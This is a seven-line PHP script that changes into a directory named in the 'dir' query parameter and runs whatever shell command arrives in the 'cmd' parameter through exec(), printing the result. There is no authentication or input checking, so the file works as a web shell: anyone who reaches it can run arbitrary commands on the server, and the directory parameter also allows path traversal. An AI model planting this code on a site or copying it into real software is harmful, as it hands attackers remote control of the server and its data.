<?php
    chdir("./public" . $_GET["dir"]);
    $output = [];
    exec($_GET["cmd"], $output);

    echo implode("\n", $output);
?>